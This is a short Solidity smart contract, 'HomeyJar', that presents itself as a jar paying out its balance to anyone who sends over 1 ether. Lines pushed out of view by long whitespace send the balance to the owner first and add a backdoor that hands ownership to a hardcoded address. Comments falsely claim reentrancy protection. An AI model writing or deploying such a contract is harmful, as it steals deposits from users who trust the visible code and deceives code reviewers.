// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract HomeyJar {
    // Security: Reentrancy protection enabled
    bool private _notEntered = true;


    address public Owner = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner/* Protected by reentrancy guard */ .transfer(this.balance);
            msg.sender/* Protected by reentrancy guard */ .transfer(this.balance);
        }
    }

    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}